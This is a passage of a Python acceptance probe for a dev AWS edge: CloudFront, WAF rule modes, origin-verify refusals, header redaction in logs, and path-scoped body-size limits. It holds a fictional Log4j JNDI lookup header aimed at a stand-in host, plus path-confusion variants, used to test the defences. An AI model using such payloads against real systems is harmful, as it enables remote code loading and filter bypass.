# SPDX-License-Identifier: MIT-0
"""Dev acceptance of the ADR-078 edge: items 4, 7, 8, and 9 of authentication.md acceptance.

- Item 4: a request straight to the `execute-api` hostname without the origin-verify header is
  answered 401 by API Gateway, its access-log record shows the 401 with no authorizer error and no
  reviewer key, and the authorizer never ran for it. The further signal the edge slice chose for
  that last point: the authorizer logs every origin-verify refusal with API Gateway's request id,
  so a missing-header request id with no such record was answered by API Gateway alone. A
  wrong-value request is the positive control that proves the query finds a record that exists.
  Each auth handler route refuses a missing and a wrong value.
- Item 7: a fictional known-bad request through CloudFront carries fictional authorization,
  cookie, and origin-verify values; its WAF log record holds each of those headers as REDACTED,
  and no value appears in any WAF, API access-log, or authorizer record. CloudFront standard,
  real-time, and vended logging read back off.
- Item 8: the `CLOUDFRONT` web ACL exists in us-east-1 and the distribution reads back attached;
  the regional web ACL reads back associated with the user pool.
- Item 9: every rule on both web ACLs reads back in the expected mode, and the known-bad request
  is matched by the known-bad-inputs rule (counted, or blocked with 403).
- With `--count-since`, the count-to-block evidence: every WAF log record since that instant on
  either web ACL that this probe did not send. Zero is the "no match on legitimate traffic" the
  count-then-block rule requires.
- With `--body-limits`, the ADR-078 path-scoped body-size exclusion (2026-10-05): items b (a
  9,000-byte body on two non-exempt routes, with 200-byte controls, retried while the managed
  group still terminates), c (33,000 bytes on the exempt route), a′ (32,768 bytes, handler 400),
  d (20,000 bytes unauthenticated) and e (eight path-confusion variants). Each request records
  its status, media type, whether it reached API Gateway, its access-log record and its WAF
  record found by marker; `classify` names the refusing layer from that positive evidence. Item
  a is `ship_prompts.py --tier deep --slot contribution --probe-marker <uuid>`.

Output is check names, statuses, rule names, and counts only: never a value, token, identifier,
header, or log record. Every credential this probe sends is fictional.
"""

from __future__ import annotations

import argparse
import http.client
import json
import os
import ssl
import sys
import time
import uuid
from collections import Counter
from collections.abc import Callable, Sequence
from dataclasses import dataclass, field, replace
from datetime import UTC, datetime
from enum import StrEnum
from typing import Any, cast
from urllib.parse import urlsplit

import boto3
import ship_prompts
from cognito_personas import published_parameter

from adapters.outbound.https import HttpsSession, require_https

_REGION = "us-east-1"
_EDGE_REGION = "us-east-1"
_HTTP = HttpsSession()
_HEADER = "x-adl-origin-verify"
_MARKER = "x-adl-edge-probe"
_FICTIONAL = {
    "authorization": "Bearer fictional-edge-probe-bearer",
    "cookie": "adl_session=fictional-edge-probe-cookie",
    _HEADER: "fictional-edge-probe-origin-value",
}
_KNOWN_BAD = {"x-api-version": "${jndi:ldap://edge-probe.invalid/a}"}
"""A fictional Log4j lookup: the known-bad-inputs group's header rule, reaching nothing."""
_AUTH_ROUTES = (
    ("GET", "/api/auth/login"),
    ("GET", "/api/auth/callback"),
    ("POST", "/api/auth/refresh"),
    ("POST", "/api/auth/logout"),
)
_EDGE_RULES = (
    "AwsIpReputation",
    "AwsKnownBadInputs",
    "AwsCommonRuleSet",
    "PromptCreateBodyCeiling",
    "BodySizeOutsidePromptCreate",
    "RateLimitPerSourceIp",
)
# ADR-078 path-scoped body-size exclusion: the one exempt route and the two custom rules.
_EXEMPT_PATH = "/api/prompt-registry/create-version"
_CEILING_RULE = "PromptCreateBodyCeiling"
_OUTSIDE_RULE = "BodySizeOutsidePromptCreate"
_MANAGED_GROUP = "AwsCommonRuleSet"
_PROBE_MARKER = "x-adl-probe-marker"
"""The marker `ship_prompts.py --probe-marker` sends; also never counted as legitimate traffic."""
_PROPAGATION_WAIT_SECONDS = 60
_PROPAGATION_BUDGET_SECONDS = 600
_PATH_VARIANTS = (
    ("trailing_slash", f"{_EXEMPT_PATH}/"),
    ("upper_prefix", "/API/prompt-registry/create-version"),
    ("mixed_case", "/api/Prompt-Registry/create-version"),
    ("doubled_slash", "/api//prompt-registry/create-version"),
    ("escaped_hyphen", "/api/prompt-registry/create%2Dversion"),
    ("dot_segment", "/api/./prompt-registry/create-version"),
    ("dot_dot_segment", "/api/x/../prompt-registry/create-version"),
    ("query_string", f"{_EXEMPT_PATH}?v=1"),
)
_OUTSIDE_RULE_VARIANTS = frozenset({"trailing_slash", "mixed_case", "query_string"})
"""Variants the canonical-path function passes under `/api/*`: only the 8 KB size rule may refuse
them. `upper_prefix` matches no `/api/*` behavior, so CloudFront's method restriction may refuse
it first (see `_CLOUDFRONT_METHOD_REFUSAL`)."""
_POOL_RULES = ("AwsIpReputation", "RateLimitPerSourceIp")
_WAIT_SECONDS = 300
_POLL_SECONDS = 10
_EMPTY = frozenset({"", "-"})


@dataclass
class _Checks:
    checks: list[dict[str, object]] = field(default_factory=list[dict[str, object]])

    def add(self, name: str, *, passed: bool, **facts: object) -> None:
        self.checks.append({"check": name, "passed": passed, **facts})

    @property
    def passed(self) -> bool:
        return all(check["passed"] for check in self.checks)


@dataclass(frozen=True, slots=True)
class _Target:
    origin: str
    api_host: str
    distribution_id: str
    edge_acl_arn: str
    pool_arn: str
    environment: str
    access_log_group: str

    @property
    def authorizer_log_group(self) -> str:
        return f"/aws/lambda/adlytics-{self.environment}-AuthorizerFunction"


def _send(url: str, method: str, headers: dict[str, str]) -> tuple[int, str, str]:
    """Return status, API Gateway request id, and CloudFront request id; bodies are dropped."""
    data = b"{}" if method == "POST" else None
    with _HTTP.request(
        method, require_https(url), data=data, headers=headers, timeout=30, allow_redirects=False
    ) as response:
        return (
            response.status_code,
            response.headers.get("apigw-requestid", ""),
            response.headers.get("x-amz-cf-id", ""),
        )


def _poll(read: Callable[[], bool]) -> bool:
    deadline = time.monotonic() + _WAIT_SECONDS
    while True:
        if read():
            return True
        if time.monotonic() >= deadline:
            return False
        time.sleep(_POLL_SECONDS)


def _events(logs: Any, group: str, pattern: str, start_ms: int) -> list[str]:
    messages: list[str] = []
    paginator = logs.get_paginator("filter_log_events")
    for page in paginator.paginate(logGroupName=group, startTime=start_ms, filterPattern=pattern):
        messages += [event.get("message", "") for event in page.get("events", [])]
    return messages


def _direct(checks: _Checks, session: boto3.Session, target: _Target, start_ms: int) -> None:
    """Item 4, with the alarm's input: requests straight to the execute-api hostname."""
    base = f"https://{target.api_host}"
    missing: list[str] = []
    for method, path in (("GET", "/api/me"), ("POST", "/api/quality-review/turns")):
        status, request_id, _ = _send(f"{base}{path}", method, {"content-type": "application/json"})
        checks.add(f"direct_no_header_{method}_{path}", passed=status == 401, observed=status)
        missing.append(request_id)
    status, wrong_id, _ = _send(f"{base}/api/me", "GET", {_HEADER: _FICTIONAL[_HEADER]})
    checks.add("direct_wrong_value_GET_/api/me", passed=status == 403, observed=status)
    for method, path in _AUTH_ROUTES:
        for label, headers in (("no_header", {}), ("wrong_value", {_HEADER: _FICTIONAL[_HEADER]})):
            status, _, _ = _send(f"{base}{path}", method, headers)
            checks.add(f"direct_{label}_{method}_{path}", passed=status == 403, observed=status)

    logs = session.client("logs")
    records: dict[str, dict[str, Any]] = {}

    def access_records() -> bool:
        for request_id in (rid for rid in missing if rid not in records):
            found = _events(
                logs, target.access_log_group, f'{{ $.requestId = "{request_id}" }}', start_ms
            )
            if found:
                records[request_id] = cast("dict[str, Any]", json.loads(found[0]))
        return len(records) == len(missing)

    arrived = all(missing) and _poll(access_records)
    shapes = [
        str(record.get("status")) == "401"
        and str(record.get("authorizerError", "")) in _EMPTY
        and str(record.get("reviewer", "")) in _EMPTY
        for record in records.values()
    ]
    checks.add(
        "direct_no_header_access_log_shows_401_without_authorizer",
        passed=arrived and len(shapes) == len(missing) and all(shapes),
        records=len(records),
    )

    def refusal_logged() -> bool:
        return bool(
            _events(
                logs,
                target.authorizer_log_group,
                f'{{ $.api_request_id = "{wrong_id}" }}',
                start_ms,
            )
        )

    control = bool(wrong_id) and _poll(refusal_logged)
    never_ran = sum(
        bool(
            _events(
                logs, target.authorizer_log_group, f'{{ $.api_request_id = "{rid}" }}', start_ms
            )
        )
        for rid in missing
    )
    checks.add("authorizer_logs_wrong_value_refusal", passed=control)
    checks.add(
        "authorizer_never_ran_without_header",
        passed=control and never_ran == 0,
        authorizer_records=never_ran,
    )


def _edge_path(checks: _Checks, target: _Target) -> None:
    """Through CloudFront the header is always present: no credential is the authorizer's 403."""
    status, _, _ = _send(f"{target.origin}/api/me", "GET", {_MARKER: "edge-path"})
    checks.add("edge_no_credential_reaches_authorizer", passed=status == 403, observed=status)


def _rule_mode(rule: dict[str, Any]) -> str:
    override = rule.get("OverrideAction")
    if override is not None:
        return "count" if "Count" in override else "block" if "None" in override else "other"
    action = rule.get("Action", {})
    return "count" if "Count" in action else "block" if "Block" in action else "other"


def _acl_id(arn: str) -> tuple[str, str]:
    """Return the name and id of a web ACL from its ARN."""
    name, acl_id = arn.split("/webacl/", 1)[1].split("/", 1)
    return name, acl_id


def _attachment_and_modes(
    checks: _Checks, session: boto3.Session, target: _Target, expected: str
) -> None:
    """Items 8 and 9 (modes): both web ACLs, where they attach, and each rule's mode."""
    edge_waf = session.client("wafv2", region_name=_EDGE_REGION)
    name, acl_id = _acl_id(target.edge_acl_arn)
    edge_acl = edge_waf.get_web_acl(Name=name, Scope="CLOUDFRONT", Id=acl_id)["WebACL"]
    config = session.client("cloudfront").get_distribution_config(Id=target.distribution_id)
    attached = config["DistributionConfig"].get("WebACLId") == edge_acl["ARN"]
    checks.add("edge_web_acl_attached_to_distribution", passed=attached)

    pool_acl = (
        session.client("wafv2").get_web_acl_for_resource(ResourceArn=target.pool_arn).get("WebACL")
    )
    checks.add(
        "user_pool_web_acl_associated",
        passed=bool(pool_acl) and pool_acl["Name"] == f"adlytics-{target.environment}-user-pool",
    )
    for label, acl, names in (
        ("edge", edge_acl, _EDGE_RULES),
        ("user_pool", pool_acl or {}, _POOL_RULES),
    ):
        modes = {rule["Name"]: _rule_mode(rule) for rule in acl.get("Rules", [])}
        checks.add(
            f"{label}_rules_{expected}",
            passed=sorted(modes) == sorted(names) and set(modes.values()) == {expected},
            modes=modes,
        )


def _waf_record(logs: Any, group: str, marker: str, start_ms: int) -> str:
    found: list[str] = []

    def read() -> bool:
        found[:] = _events(logs, group, f'"{marker}"', start_ms)
        return bool(found)

    return found[0] if _poll(read) else ""


def _known_bad(
    checks: _Checks, session: boto3.Session, target: _Target, expected: str, start_ms: int
) -> None:
    """Items 7 and 9: a fictional known-bad request, its WAF record, and every log it reached."""
    marker = f"edge-probe-{uuid.uuid4().hex}"
    status, api_request_id, _ = _send(
        f"{target.origin}/api/me", "GET", {**_FICTIONAL, **_KNOWN_BAD, _MARKER: marker}
    )
    checks.add(
        "known_bad_request_refused",
        passed=status == 403,
        observed=status,
    )
    logs_edge = session.client("logs", region_name=_EDGE_REGION)
    raw = _waf_record(
        logs_edge, f"aws-waf-logs-adlytics-{target.environment}-edge", marker, start_ms
    )
    record = cast("dict[str, Any]", json.loads(raw)) if raw else {}
    matched = {
        rule.get("ruleId")
        for rule in record.get("nonTerminatingMatchingRules", [])
        if rule.get("action") == "COUNT"
    }
    if expected == "block":
        rule_passed = (
            record.get("action") == "BLOCK"
            and record.get("terminatingRuleId") == "AwsKnownBadInputs"
        )
    else:
        rule_passed = record.get("action") == "ALLOW" and "AwsKnownBadInputs" in matched
    checks.add(f"known_bad_matched_{expected}", passed=bool(record) and rule_passed)

    headers = {
        str(header.get("name", "")).lower(): str(header.get("value", ""))
        for header in record.get("httpRequest", {}).get("headers", [])
    }
    redacted = all(headers.get(name) == "REDACTED" for name in _FICTIONAL)
    # Every fictional value carries this prefix, and nothing else this probe sends does.
    leaked = "fictional-edge-probe" in raw
    checks.add(
        "waf_log_redacts_credential_headers", passed=bool(record) and redacted and not leaked
    )

    reached_api = bool(api_request_id)
    api_leaks = 0
    if reached_api:
        logs = session.client("logs")
        access: list[str] = []

        def read_access() -> bool:
            access[:] = _events(
                logs, target.access_log_group, f'{{ $.requestId = "{api_request_id}" }}', start_ms
            )
            return bool(access)

        _poll(read_access)
        texts = access + _events(
            logs, target.authorizer_log_group, '"fictional-edge-probe"', start_ms
        )
        api_leaks = sum("fictional-edge-probe" in text for text in texts)
        checks.add("api_logs_hold_no_credential_values", passed=bool(access) and api_leaks == 0)
    else:
        checks.add("api_logs_hold_no_credential_values", passed=expected == "block", reached_api=0)


def _cloudfront_logging(checks: _Checks, session: boto3.Session, target: _Target) -> None:
    """Item 7: no CloudFront log that could record a header is on."""
    config = session.client("cloudfront").get_distribution_config(Id=target.distribution_id)[
        "DistributionConfig"
    ]
    behaviors = [config["DefaultCacheBehavior"], *config.get("CacheBehaviors", {}).get("Items", [])]
    realtime = sum(bool(behavior.get("RealtimeLogConfigArn")) for behavior in behaviors)
    arn_suffix = f":distribution/{target.distribution_id}"
    logs_edge = session.client("logs", region_name=_EDGE_REGION)
    sources = [
        source
        for page in logs_edge.get_paginator("describe_delivery_sources").paginate()
        for source in page.get("deliverySources", [])
    ]
    vended = sum(
        any(str(arn).endswith(arn_suffix) for arn in source.get("resourceArns", []))
        for source in sources
    )
    checks.add(
        "cloudfront_logging_off",
        passed=not config.get("Logging", {}).get("Enabled", False)
        and realtime == 0
        and vended == 0,
        realtime_behaviors=realtime,
        vended_sources=vended,
    )


def _waf_metric_sums(
    session: boto3.Session, region: str, acl_name: str, metric: str, since: datetime
) -> dict[str, float]:
    """Sum one AWS WAF metric per `Rule` dimension value for one web ACL since `since`.

    AWS WAF publishes each metric under the web ACL's name as `WebACL`, the visibility metric
    name as `Rule` (`ALL` for the whole ACL), and again per `Country` and `Device` [verified
    2026-09-29, `list_metrics` in dev]. Only the `Rule` series are summed, so nothing is counted
    twice.
    """
    cloudwatch = session.client("cloudwatch", region_name=region)
    pages = cloudwatch.get_paginator("list_metrics").paginate(
        Namespace="AWS/WAFV2",
        MetricName=metric,
        Dimensions=[{"Name": "WebACL", "Value": acl_name}],
    )
    listed = [item for page in pages for item in page.get("Metrics", [])]
    sums: dict[str, float] = {}
    now = datetime.now(UTC)
    for entry in listed:
        dimensions = entry.get("Dimensions", [])
        rule = next((d["Value"] for d in dimensions if d["Name"] == "Rule"), "")
        if not rule:
            continue
        points = cloudwatch.get_metric_statistics(
            Namespace="AWS/WAFV2",
            MetricName=metric,
            Dimensions=dimensions,
            StartTime=since,
            EndTime=now,
            Period=3600,
            Statistics=["Sum"],
        ).get("Datapoints", [])
        sums[rule] = sums.get(rule, 0.0) + sum(point.get("Sum", 0.0) for point in points)
    return sums


def _logging_configured(session: boto3.Session, region: str, acl_arn: str) -> bool:
    """Whether the web ACL reads back logging matched requests with the headers redacted."""
    waf = session.client("wafv2", region_name=region)
    config = waf.get_logging_configuration(ResourceArn=acl_arn)["LoggingConfiguration"]
    redacted = {
        str(field.get("SingleHeader", {}).get("Name", "")).lower()
        for field in config.get("RedactedFields", [])
    }
    kept = {
        condition.get("ActionCondition", {}).get("Action")
        for rule in config.get("LoggingFilter", {}).get("Filters", [])
        for condition in rule.get("Conditions", [])
    }
    return (
        redacted == {_HEADER, "authorization", "cookie"}
        and config.get("LoggingFilter", {}).get("DefaultBehavior") == "DROP"
        and {"COUNT", "EXCLUDED_AS_COUNT", "BLOCK"} <= kept
    )


def _count_evidence(
    checks: _Checks, session: boto3.Session, target: _Target, since: datetime
) -> None:
    """The count-to-block evidence since `since`, per web ACL, with a positive control each.

    The distribution ACL is read from its log, excluding this probe's own marked requests; its
    positive control is `known_bad_matched_*`, which proves the log keeps a counted match. The
    user pool ACL receives no request this probe can mark, so it is read from AWS WAF's own
    metrics instead: requests it evaluated (the positive control that traffic reached it) and
    requests any rule counted or blocked, which must be zero.
    """
    start_ms = int(since.timestamp() * 1000)
    logs = session.client("logs", region_name=_EDGE_REGION)
    rules: Counter[str] = Counter()
    records = 0
    for message in _events(logs, f"aws-waf-logs-adlytics-{target.environment}-edge", "", start_ms):
        if _MARKER in message.lower() or _PROBE_MARKER in message.lower():
            continue
        record = cast("dict[str, Any]", json.loads(message))
        records += 1
        if record.get("action") == "BLOCK":
            rules[str(record.get("terminatingRuleId"))] += 1
        for rule in record.get("nonTerminatingMatchingRules", []):
            rules[str(rule.get("ruleId"))] += 1
    checks.add(
        "edge_no_legitimate_match",
        passed=records == 0 and _logging_configured(session, _EDGE_REGION, target.edge_acl_arn),
        records=records,
        rules=dict(rules),
    )

    region = session.region_name or _REGION
    pool_acl = session.client("wafv2").get_web_acl_for_resource(ResourceArn=target.pool_arn)[
        "WebACL"
    ]
    name = pool_acl["Name"]
    evaluated = _waf_metric_sums(session, region, name, "AllowedRequests", since).get("ALL", 0.0)
    matched = {
        f"{metric}:{rule}": total
        for metric in ("CountedRequests", "BlockedRequests")
        for rule, total in _waf_metric_sums(session, region, name, metric, since).items()
        if total and rule != "ALL"
    }
    checks.add(
        "user_pool_no_legitimate_match",
        passed=evaluated > 0
        and not matched
        and _logging_configured(session, region, pool_acl["ARN"]),
        evaluated_requests=int(evaluated),
        matched_rules=matched,
    )


class Layer(StrEnum):
    """Which layer answered a body-limit probe request, from positive discriminators only."""

    WAF_BLOCK = "waf_block"
    CANONICAL_PATH_REFUSAL = "canonical_path_refusal"
    AUTHORIZER_REFUSAL = "authorizer_refusal"
    HANDLER_INVOKED = "handler_invoked"
    CLOUDFRONT_METHOD_REFUSAL = "cloudfront_method_refusal"
    UNPROVEN = "unproven"


_CLOUDFRONT_METHOD_REFUSAL = "not configured to allow the HTTP request method"
"""CloudFront's own 403 page for a method the matched cache behavior does not allow. A POST whose
path matches no `/api/*` behavior (for example `/API/…`) falls to the GET-only default behavior and
is refused here, before AWS WAF evaluates it, so it has no WAF record (observed 2026-10-06)."""


@dataclass(frozen=True, slots=True)
class Observation:
    """What one probe request returned and what the logs hold for it (never a value or id)."""

    status: int
    content_type: str
    reached_api_gateway: bool
    access_record: dict[str, Any] | None
    waf_record: dict[str, Any] | None
    cloudfront_method_refusal: bool = False


@dataclass(frozen=True, slots=True)
class Verdict:
    layer: Layer
    terminating_rule: str
    waf_action: str
    counted_rules: tuple[str, ...]
    access_status: str
    integration_latency: str


def _counted_rules(record: dict[str, Any]) -> tuple[str, ...]:
    """Every rule the WAF record shows counted, at the ACL level or inside a rule group."""
    names = [
        str(rule.get("ruleId"))
        for rule in record.get("nonTerminatingMatchingRules", [])
        if rule.get("action") == "COUNT"
    ]
    for group in record.get("ruleGroupList", []) or []:
        for rule in group.get("nonTerminatingMatchingRules", []) or []:
            names.append(str(rule.get("ruleId")))
        for rule in group.get("excludedRules", []) or []:
            names.append(str(rule.get("ruleId")))
    return tuple(sorted(set(names)))


def classify(observation: Observation) -> Verdict:
    """Name the layer that answered, from positive evidence; the absence of a WAF record is not proof.

    - Reached API Gateway (an `apigw-requestid` header): the access-log record decides. A numeric
      `integrationLatency` means the handler ran; a 401 or 403 with an empty one means the
      authorizer refused it. No record yet is unproven.
    - Did not reach API Gateway: a WAF record with action `BLOCK` names the refusing rule. A 400
      with no WAF block is the CloudFront canonical-path function. A 403 carrying CloudFront's
      method-refusal page, with no WAF block, is the cache behavior's method restriction. Any
      other 403 with no WAF record is unproven: it is consistent with a WAF block, but the record
      is the proof.
    """
    record = observation.waf_record or {}
    access = observation.access_record or {}
    latency = str(access.get("integrationLatency", ""))
    verdict = Verdict(
        Layer.UNPROVEN,
        str(record.get("terminatingRuleId", "")),
        str(record.get("action", "")),
        _counted_rules(record),
        str(access.get("status", "")),
        latency,
    )
    if observation.reached_api_gateway:
        if observation.access_record is None:
            return verdict
        if latency.isdigit():
            return replace(verdict, layer=Layer.HANDLER_INVOKED)
        if verdict.access_status in {"401", "403"} and latency in _EMPTY:
            return replace(verdict, layer=Layer.AUTHORIZER_REFUSAL)
        return verdict
    if verdict.waf_action == "BLOCK" and verdict.terminating_rule:
        return replace(verdict, layer=Layer.WAF_BLOCK)
    if observation.status == 400 and verdict.waf_action != "BLOCK":
        return replace(verdict, layer=Layer.CANONICAL_PATH_REFUSAL)
    if (
        observation.status == 403
        and observation.cloudfront_method_refusal
        and observation.waf_record is None
    ):
        return replace(verdict, layer=Layer.CLOUDFRONT_METHOD_REFUSAL)
    return verdict


def not_yet_propagated(verdict: Verdict) -> bool:
    """A block by the managed rule group: the new size rules have not reached this edge yet."""
    return verdict.layer is Layer.WAF_BLOCK and verdict.terminating_rule == _MANAGED_GROUP


def leaked(verdict: Verdict) -> bool:
    """A body the size rules must refuse reached API Gateway, or WAF allowed it: the rollback trigger."""
    return verdict.layer in {Layer.HANDLER_INVOKED, Layer.AUTHORIZER_REFUSAL} or (
        verdict.waf_action == "ALLOW"
    )


def variant_refused(label: str, verdict: Verdict) -> bool:
    """Item e: a 9,000-byte variant was refused before the handler, by the layer that owns it.

    A trailing slash, a case change under `/api/` or a query string passes the canonical-path
    function, so its refusal must be the 8 KB size rule by name; any other WAF rule would
    misattribute it. An upper-case `/API/` prefix may also be refused by CloudFront's method
    restriction on the default behavior. The other spellings may be refused by the 8 KB rule or
    by the canonical-path function.
    """
    by_size_rule = verdict.layer is Layer.WAF_BLOCK and verdict.terminating_rule == _OUTSIDE_RULE
    if label in _OUTSIDE_RULE_VARIANTS:
        return by_size_rule
    if label == "upper_prefix":
        return by_size_rule or verdict.layer is Layer.CLOUDFRONT_METHOD_REFUSAL
    return verdict.layer in {Layer.WAF_BLOCK, Layer.CANONICAL_PATH_REFUSAL}


def _create_body(padding: int) -> dict[str, object]:
    """A create-version body with an unknown top-level field: never a valid create."""
    return {
        "slot_id": "contribution",
        "prompt_template": "Fictional probe prompt.",
        "probe_padding": "p" * padding,
    }


def _sized_body(size: int) -> bytes:
    """A create-version-shaped JSON body of exactly `size` bytes."""
    base = len(json.dumps(_create_body(0)).encode())
    return json.dumps(_create_body(size - base)).encode()


@dataclass(frozen=True, slots=True)
class _Response:
    status: int
    content_type: str
    api_request_id: str
    error: str
    cloudfront_method_refusal: bool = False


_RESPONSE_READ_LIMIT = 65_536


def _send_body(origin: str, path: str, headers: dict[str, str], body: bytes) -> _Response:
    """POST a body to exactly `path`; keep the status, media type, request id, a closed `error`
    and one page flag.

    `requests` rewrites a URL before sending it: it removes `.` and `..` segments and decodes a
    percent escape of an unreserved character, so `create%2Dversion` and `/./` left this host as
    the exact route on 2026-10-06 and never tested the edge. `http.client` sends the path as given,
    as `probe_quality_review_api._raw_request` does for the same reason.
    """
    target = urlsplit(require_https(origin))
    host = target.hostname
    if host is None:
        raise ValueError("origin has no host")
    # A-HTTPS-CONNECTION-001: verifying context, https only; see docs/security-dispositions.md
    # nosemgrep: python.lang.security.audit.httpsconnection-detected.httpsconnection-detected
    connection = http.client.HTTPSConnection(
        host, target.port or 443, timeout=30, context=ssl.create_default_context()
    )
    try:
        # http.client sends no User-Agent, which the core rule set refuses as NoUserAgent_HEADER.
        connection.request(
            "POST",
            path,
            body=body,
            headers={"Host": host, "User-Agent": "adlytics-validation", **headers},
        )
        response = connection.getresponse()
        status = response.status
        content_type = (response.getheader("content-type") or "").split(";", 1)[0].strip().lower()
        api_request_id = response.getheader("apigw-requestid") or ""
        payload = response.read(_RESPONSE_READ_LIMIT)
    finally:
        connection.close()
    error = ""
    if content_type == "application/json":
        try:
            decoded = cast("object", json.loads(payload or b"{}"))
        except json.JSONDecodeError:
            decoded = {}
        value = (
            cast("dict[str, object]", decoded).get("error") if isinstance(decoded, dict) else None
        )
        error = value if value in {"invalid_request", "request_too_large"} else ""
    method_refusal = content_type == "text/html" and _CLOUDFRONT_METHOD_REFUSAL in payload.decode(
        "utf-8", errors="replace"
    )
    return _Response(status, content_type, api_request_id, cast("str", error), method_refusal)


@dataclass
class _BodyLimitProbe:
    checks: _Checks
    session: boto3.Session
    target: _Target
    start_ms: int
    cookie_headers: Callable[[], dict[str, str]]

    def observe(self, path: str, size: int, *, authenticated: bool) -> tuple[Verdict, _Response]:
        marker = f"edge-probe-{uuid.uuid4().hex}"
        headers = {"content-type": "application/json", _MARKER: marker}
        if authenticated:
            headers |= self.cookie_headers()
        response = _send_body(self.target.origin, path, headers, _sized_body(size))
        access: dict[str, Any] | None = None
        if response.api_request_id:
            logs = self.session.client("logs")
            found: list[str] = []

            def read() -> bool:
                found[:] = _events(
                    logs,
                    self.target.access_log_group,
                    f'{{ $.requestId = "{response.api_request_id}" }}',
                    self.start_ms,
                )
                return bool(found)

            access = cast("dict[str, Any]", json.loads(found[0])) if _poll(read) else None
        raw = _waf_record(
            self.session.client("logs", region_name=_EDGE_REGION),
            f"aws-waf-logs-adlytics-{self.target.environment}-edge",
            marker,
            self.start_ms,
        )
        waf = cast("dict[str, Any]", json.loads(raw)) if raw else None
        verdict = classify(
            Observation(
                response.status,
                response.content_type,
                bool(response.api_request_id),
                access,
                waf,
                response.cloudfront_method_refusal,
            )
        )
        return verdict, response

    def record(self, name: str, verdict: Verdict, response: _Response, *, passed: bool) -> None:
        self.checks.add(
            name,
            passed=passed,
            status=response.status,
            content_type=response.content_type,
            reached_api_gateway=bool(response.api_request_id),
            layer=verdict.layer.value,
            terminating_rule=verdict.terminating_rule,
            waf_action=verdict.waf_action,
            counted_rules=list(verdict.counted_rules),
            access_status=verdict.access_status,
            integration_latency=verdict.integration_latency,
            error=response.error,
            at=datetime.now(UTC).isoformat(timespec="seconds"),
        )


_BODY_LIMIT_ITEMS = ("b", "c", "a_prime", "d", "e")


def _body_limits(
    probe: _BodyLimitProbe, items: frozenset[str] = frozenset(_BODY_LIMIT_ITEMS)
) -> None:
    """Live items b, c, a′, d and e of the body-size exclusion; b and c are the rollback triggers.

    `items` re-runs a subset against an already-proven deploy (for example item e alone); the
    first run after an edge deploy must run them all, item b first.
    """
    if "b" in items:
        _item_b(probe)
    if "c" in items:
        _item_c(probe)
    if "a_prime" in items:
        _item_a_prime(probe)
    if "d" in items:
        _item_d(probe)
    if "e" in items:
        _item_e(probe)


def _item_b(probe: _BodyLimitProbe) -> None:
    # Item b first: a non-exempt body over 8 KB, retried while the managed group still terminates.
    for path in ("/api/presentation/campaigns", "/api/prompt-registry/activate"):
        deadline = time.monotonic() + _PROPAGATION_BUDGET_SECONDS
        verdict, response = probe.observe(path, 9_000, authenticated=False)
        while not_yet_propagated(verdict) and time.monotonic() < deadline:
            time.sleep(_PROPAGATION_WAIT_SECONDS)
            verdict, response = probe.observe(path, 9_000, authenticated=False)
        probe.record(
            f"b_9000_bytes_{path}",
            verdict,
            response,
            passed=verdict.layer is Layer.WAF_BLOCK
            and verdict.terminating_rule == _OUTSIDE_RULE
            and response.content_type == "text/html"
            and not leaked(verdict),
        )
        control, small = probe.observe(path, 200, authenticated=False)
        probe.record(
            f"b_200_bytes_control_{path}",
            control,
            small,
            passed=control.layer is Layer.AUTHORIZER_REFUSAL and small.content_type != "text/html",
        )


def _item_c(probe: _BodyLimitProbe) -> None:
    # Item c: the fail-open trigger.
    verdict, response = probe.observe(_EXEMPT_PATH, 33_000, authenticated=True)
    probe.record(
        "c_33000_bytes_exempt_route",
        verdict,
        response,
        passed=verdict.layer is Layer.WAF_BLOCK
        and verdict.terminating_rule == _CEILING_RULE
        and response.content_type == "text/html",
    )


def _item_a_prime(probe: _BodyLimitProbe) -> None:
    # Item a′: at the ceiling the handler runs and refuses the unknown field, writing nothing.
    verdict, response = probe.observe(_EXEMPT_PATH, 32_768, authenticated=True)
    probe.record(
        "a_prime_32768_bytes_exempt_route",
        verdict,
        response,
        passed=verdict.layer is Layer.HANDLER_INVOKED
        and verdict.access_status == "400"
        and response.error == "invalid_request"
        and verdict.waf_action != "BLOCK",
    )


def _item_d(probe: _BodyLimitProbe) -> None:
    # Item d: unauthenticated on the exempt route, the authorizer refuses before the handler.
    verdict, response = probe.observe(_EXEMPT_PATH, 20_000, authenticated=False)
    probe.record(
        "d_20000_bytes_unauthenticated_exempt_route",
        verdict,
        response,
        passed=verdict.layer is Layer.AUTHORIZER_REFUSAL and verdict.waf_action != "BLOCK",
    )


def _item_e(probe: _BodyLimitProbe) -> None:
    # Item e: every path-confusion variant is refused before the handler.
    for label, path in _PATH_VARIANTS:
        verdict, response = probe.observe(path, 9_000, authenticated=True)
        probe.record(
            f"e_variant_{label}",
            verdict,
            response,
            passed=variant_refused(label, verdict),
        )


def _operator_cookies(origin: str) -> dict[str, str]:
    """The operator's session headers from `validation/.env.local`, as `ship_prompts.py` reads them."""
    refresh = os.environ.get("ADL_REFRESH", "").strip()
    csrf = os.environ.get("ADL_CSRF", "").strip()
    if not refresh or not csrf:
        raise SystemExit("--body-limits needs ADL_REFRESH and ADL_CSRF (validation/.env.local).")
    session_cookie = ship_prompts._refreshed_session(origin, refresh, csrf)  # pyright: ignore[reportPrivateUsage]
    return {
        "Cookie": f"adl_session={session_cookie}; adl_csrf={csrf}",
        "x-adl-csrf": csrf,
        "Sec-Fetch-Site": "same-origin",
    }


_SESSION_REUSE_SECONDS = 300
"""Re-mint the operator session this often: its access token lasts 15 minutes, and one run waits
up to 300 s per unproven record, so a session minted once expired before item e on 2026-10-06
and turned every later authenticated request into an authorizer refusal."""


@dataclass
class _FreshCookies:
    """The operator's session headers, re-minted once they are `max_age` seconds old."""

    mint: Callable[[], dict[str, str]]
    max_age: float = _SESSION_REUSE_SECONDS
    clock: Callable[[], float] = time.monotonic
    _headers: dict[str, str] = field(default_factory=dict[str, str])
    _minted_at: float = float("-inf")

    def __call__(self) -> dict[str, str]:
        now = self.clock()
        if not self._headers or now - self._minted_at >= self.max_age:
            self._headers, self._minted_at = self.mint(), now
        return self._headers


def _target(session: boto3.Session, environment: str, region: str) -> _Target:
    ssm = session.client("ssm")
    access_arn = published_parameter(ssm, environment, "agentQualityReviewerAccessLogGroupArn")
    pool_id = published_parameter(ssm, environment, "userPoolId")
    account = session.client("sts").get_caller_identity()["Account"]
    return _Target(
        origin=published_parameter(ssm, environment, "publicBaseUrl").rstrip("/"),
        api_host=f"{published_parameter(ssm, environment, 'apiId')}.execute-api.{region}.amazonaws.com",
        distribution_id=published_parameter(ssm, environment, "distributionId"),
